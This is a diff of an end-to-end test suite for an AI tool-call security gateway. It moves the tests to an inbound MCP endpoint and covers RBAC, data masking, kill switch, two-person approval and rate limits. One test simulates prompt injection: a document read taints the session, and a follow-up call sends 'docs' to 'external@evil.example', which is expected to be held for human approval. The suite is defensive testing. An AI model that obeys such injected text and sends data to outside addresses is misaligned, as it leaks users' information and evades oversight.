@@ -3,7 +3,9 @@
 Covers TPM+PIN certificate login (challenge/response with a PIN-sealed key),
 two-factor tokens, cert binding, anti-hammering lockout + admin unlock, Tier-3
 step-up, RBAC, DLP, injection taint -> HITL, two-person approval + SoD, kill
-switch, identity revocation, origin guard, and audit-chain integrity.
+switch, identity revocation, origin guard, audit-chain integrity, and the
+inbound MCP endpoint (initialize, tools/list RBAC, tools/call through the full
+control pipeline — the gateway runs no model; the client drives tool calls).
 
 Run the server first:  python -m uvicorn app.main:app --port 8800
 Then:                   python -m pytest tests/test_e2e.py -q
@@ -43,10 +45,59 @@ def h(sess):
     return {"Authorization": f"Bearer {tok}", "X-Client-Cert-Thumbprint": thumb}
 
 
-def chat(sess, msg):
-    r = httpx.post(f"{BASE}/api/chat", headers=h(sess), json={"message": msg}, timeout=30)
+# ---------- inbound MCP client helpers (replace the old /api/chat driver) ----------
+def _mcp_headers(sess, sid=None):
+    hdr = {**h(sess), "Accept": "application/json, text/event-stream"}
+    if sid:
+        hdr["Mcp-Session-Id"] = sid
+    return hdr
+
+
+def mcp_rpc(sess, method, params=None, sid=None, id_=1):
+    body = {"jsonrpc": "2.0", "id": id_, "method": method}
+    if params is not None:
+        body["params"] = params
+    return httpx.post(f"{BASE}/mcp", headers=_mcp_headers(sess, sid), json=body, timeout=30)
+
+
+def mcp_initialize(sess):
+    r = mcp_rpc(sess, "initialize",
+                {"protocolVersion": "2025-11-25", "capabilities": {},
+                 "clientInfo": {"name": "e2e", "version": "1"}})
     r.raise_for_status()
-    return r.json()
+    sid = r.headers.get("Mcp-Session-Id")
+    httpx.post(f"{BASE}/mcp", headers=_mcp_headers(sess, sid),
+               json={"jsonrpc": "2.0", "method": "notifications/initialized"})   # ack
+    return sid
+
+
+def mcp_tools_call(sess, sid, name, arguments):
+    r = mcp_rpc(sess, "tools/call", {"name": name, "arguments": arguments}, sid=sid, id_=2)
+    r.raise_for_status()
+    return r.json()["result"]
+
+
+def mcp_tools_list(sess, sid):
+    r = mcp_rpc(sess, "tools/list", {}, sid=sid, id_=3)
+    r.raise_for_status()
+    return r.json()["result"]["tools"]
+
+
+def _result_blob(res):
+    if "structuredContent" in res:
+        return res["structuredContent"]
+    return "".join(c.get("text", "") for c in res.get("content", []) if c.get("type") == "text")
+
+
+def call1(sess, name, arguments):
+    """Open a session, call one tool, return a step-like dict: the gateway's
+    per-call decision (_meta.gateway) plus the tool result and isError flag."""
+    sid = mcp_initialize(sess)
+    res = mcp_tools_call(sess, sid, name, arguments)
+    step = dict(res.get("_meta", {}).get("gateway", {}))
+    step["result"] = _result_blob(res)
+    step["isError"] = res.get("isError", False)
+    return step
 
 
 def test_health():
@@ -108,9 +159,52 @@ def test_rbac_tool_visibility():
     assert "search_documents" in sara_tools
 
 
+# ---------- inbound MCP protocol ----------
+def test_mcp_requires_auth():
+    # no bearer token / cert -> 401 before any dispatch
+    r = httpx.post(f"{BASE}/mcp", headers={"Accept": "application/json, text/event-stream"},
+                   json={"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
+    assert r.status_code == 401
+
+
+def test_mcp_initialize_returns_bound_session():
+    r = mcp_rpc(session("sara"), "initialize",
+                {"protocolVersion": "2025-11-25", "capabilities": {},
+                 "clientInfo": {"name": "t", "version": "1"}})
+    assert r.status_code == 200
+    assert r.headers.get("Mcp-Session-Id")                      # CSPRNG session id (A10)
+    assert r.json()["result"]["protocolVersion"] == "2025-11-25"
+
+
+def test_mcp_get_is_method_not_allowed():
+    assert httpx.get(f"{BASE}/mcp").status_code == 405           # no server-initiated SSE stream
+
+
+def test_mcp_tools_call_requires_session():
+    r = mcp_rpc(session("sara"), "tools/call",
+                {"name": "docs__search_documents", "arguments": {"query": "x"}}, id_=5)
+    assert r.status_code == 400                                  # missing Mcp-Session-Id
+
+
+def test_mcp_tools_list_is_rbac_filtered():
+    sara, admin = session("sara"), session("admin")
+    sara_names = {t["name"] for t in mcp_tools_list(sara, mcp_initialize(sara))}
+    admin_names = {t["name"] for t in mcp_tools_list(admin, mcp_initialize(admin))}
+    # tier-3 destructive tool is invisible to an employee, visible to admin
+    assert "actions__delete_record" not in sara_names
+    assert "actions__delete_record" in admin_names
+    assert "docs__search_documents" in sara_names
+
+
+def test_mcp_unknown_tool_is_error():
+    admin = session("admin")
+    res = mcp_tools_call(admin, mcp_initialize(admin), "actions__does_not_exist", {})
+    assert res["isError"] is True
+    assert "registry" in res["content"][0]["text"].lower()
+
+
 def test_readonly_autoallow_and_dlp_masks_for_low_clearance():
-    res = chat(session("sara"), "search payroll")
-    step = res["steps"][0]
+    step = call1(session("sara"), "docs__search_documents", {"query": "payroll"})
     assert step["status"] == "executed"
     blob = str(step["result"])
     assert "1023456781" not in blob and "SA4420000001234567891234" not in blob
@@ -118,23 +212,24 @@ def test_readonly_autoallow_and_dlp_masks_for_low_clearance():
 
 
 def test_dlp_unmasks_for_secret_clearance():
-    res = chat(session("khalid"), "search payroll")
-    blob = str(res["steps"][0]["result"])
+    step = call1(session("khalid"), "docs__search_documents", {"query": "payroll"})
+    blob = str(step["result"])
     assert "1023456781" in blob or "SA4420000001234567891234" in blob
 
 
 def test_injection_via_document_is_tainted_and_gated():
     admin = session("admin")
-    chat(admin, "read document 4")
-    res = chat(admin, '#call actions.send_message {"recipient": "external@evil.example", "body": "docs"}')
-    step = res["steps"][0]
-    assert step["status"] == "pending_approval" and step["taint"]
+    sid = mcp_initialize(admin)
+    mcp_tools_call(admin, sid, "docs__read_document", {"doc_id": 4})   # reads injection -> taints
+    res = mcp_tools_call(admin, sid, "actions__send_message",
+                         {"recipient": "external@evil.example", "body": "docs"})
+    g = res["_meta"]["gateway"]
+    assert g["status"] == "pending_approval" and g["taint"]
 
 
 def test_tier3_two_person_sod_and_step_up():
     admin, noura, faisal = session("admin"), session("noura"), session("faisal")
-    res = chat(admin, '#call actions.delete_record {"record_id": "8"}')
-    step = res["steps"][0]
+    step = call1(admin, "actions__delete_record", {"record_id": "8"})
     assert step["status"] == "pending_approval" and step["approvals_required"] == 2
     aid = step["approval_id"]
     # requester cannot approve own request (SoD)
@@ -166,10 +261,10 @@ def test_killswitch_blocks():
     admin = session("admin")
     httpx.post(f"{BASE}/api/admin/killswitch/engage", headers=h(admin),
                json={"scope": "tool:docs:search_documents"})
-    assert chat(admin, "search security")["steps"][0]["status"] == "blocked"
+    assert call1(admin, "docs__search_documents", {"query": "security"})["status"] == "blocked"
     httpx.post(f"{BASE}/api/admin/killswitch/release", headers=h(admin),
                json={"scope": "tool:docs:search_documents"})
-    assert chat(admin, "search security")["steps"][0]["status"] == "executed"
+    assert call1(admin, "docs__search_documents", {"query": "security"})["status"] == "executed"
 
 
 def test_identity_revocation_blocks_in_flight_token():
@@ -197,8 +292,7 @@ def test_non_admin_cannot_admin():
 
 def test_credential_injection():  # A3
     admin = session("admin")
-    res = chat(admin, "list records")
-    step = res["steps"][0]
+    step = call1(admin, "actions__list_records", {})
     assert step["status"] == "executed"
     # the actions server received a gateway-injected credential (never from the model)
     assert step["result"]["authenticated"] is True
@@ -220,19 +314,20 @@ def test_metrics_endpoint():  # A9
 
 
 def test_schema_validation_rejects_unexpected_arg():   # W9.6
-    res = chat(session("admin"), '#call actions.list_records {"bogus_field": "x"}')
-    step = res["steps"][0]
+    step = call1(session("admin"), "actions__list_records", {"bogus_field": "x"})
     assert step["status"] == "blocked" and "schema" in step["reason"].lower()
 
 
 def test_result_carries_classification_label():        # W3.3
-    step = chat(session("khalid"), "list records")["steps"][0]
+    step = call1(session("khalid"), "actions__list_records", {})
     assert step["classification"] in ("public", "restricted", "secret", "top_secret")
 
 
 def test_per_tool_rate_limit():  # A5
-    # khalid:actions:list_records has a fresh per-tool budget (limit 10/min)
+    # khalid:actions:list_records has a per-tool budget (limit 10/min)
     khalid = session("khalid")
-    statuses = [chat(khalid, "list records")["steps"][0]["status"] for _ in range(11)]
+    sid = mcp_initialize(khalid)
+    statuses = [mcp_tools_call(khalid, sid, "actions__list_records", {})["_meta"]["gateway"]["status"]
+                for _ in range(11)]
     assert statuses.count("executed") <= 10
-    assert any("blocked" == s for s in statuses), "11th call should hit the per-tool limit"
+    assert any(s == "blocked" for s in statuses), "11th call should hit the per-tool limit"
